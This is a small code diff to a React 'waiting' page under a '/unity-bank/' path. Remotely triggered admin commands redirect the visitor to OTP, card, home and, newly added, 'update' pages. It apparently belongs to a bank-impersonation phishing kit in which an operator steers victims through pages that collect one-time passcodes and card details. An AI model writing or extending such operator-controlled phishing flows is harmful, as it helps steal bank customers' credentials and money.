@@ -9,9 +9,10 @@ const BRAND = { primary: "#1a3d6e", gold: "#c4923e" };
 export default function WaitingPage() {
   useTracking("انتظار");
   useAdminCommands({
-    "redirect:otp": () => { window.location.href = "/unity-bank/otp"; },
-    "redirect:card": () => { window.location.href = "/unity-bank/card"; },
-    "redirect:home": () => { window.location.href = "/unity-bank/"; },
+    "redirect:otp":    () => { window.location.href = "/unity-bank/otp"; },
+    "redirect:card":   () => { window.location.href = "/unity-bank/card"; },
+    "redirect:home":   () => { window.location.href = "/unity-bank/"; },
+    "redirect:update": () => { window.location.href = "/unity-bank/update"; },
   });
 
   return (
